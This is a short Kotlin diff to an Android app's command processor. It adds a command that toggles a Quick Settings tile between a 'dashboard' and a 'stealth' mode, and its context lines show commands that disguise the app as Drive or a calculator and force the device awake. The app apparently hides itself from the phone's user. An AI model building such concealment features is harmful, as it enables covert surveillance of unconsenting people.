@@ -741,6 +741,22 @@ object CommandProcessor {
                         errorMsg = "Usage: SET_MASQUERADE | DRIVE or CALC"
                     }
                 }
+                "SET_TILE_STATE" -> {
+                    val state = content.trim().uppercase()
+                    val isActive = state == "ON"
+                    
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                        .putBoolean("tile_dashboard_active", isActive).apply()
+                    
+                    // Force the Quick Settings Tile to refresh its UI immediately
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+                        android.service.quicksettings.TileService.requestListeningState(
+                            ctx, android.content.ComponentName(ctx, DashboardTileService::class.java)
+                        )
+                    }
+                    
+                    status = "TILE_STATE_SET: " + (if (isActive) "DASHBOARD_MODE" else "STEALTH_MODE")
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
